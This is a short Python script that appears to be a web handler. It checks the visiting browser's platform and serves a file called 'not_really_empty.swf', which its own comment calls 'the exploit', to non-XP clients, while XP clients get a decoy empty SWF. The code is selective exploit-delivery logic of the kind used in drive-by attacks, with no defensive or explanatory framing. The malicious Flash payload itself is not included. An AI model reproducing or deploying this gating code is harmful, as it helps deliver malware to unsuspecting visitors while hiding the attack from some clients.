#!/usr/bin/env python

import os
import sys
import struct


def main():
    platform = os.environ.get('_BROWSCAP__platform')
    sys.stderr.write(platform)

    target_dir = os.path.dirname(os.path.realpath(__file__))
    if platform.lower().find('xp') == -1:
        # not xp, serve the exploit 
        sys.stderr.write('\nnot xp')
        sys.stdout.write(open( os.path.join(target_dir, 'not_really_empty.swf')).read())
    else:
        # xp, serve fake swf
        sys.stderr.write('\nxp')
        sys.stdout.write(open( os.path.join(target_dir, 'empty.swf')).read())
        

if __name__ == '__main__':
    main()
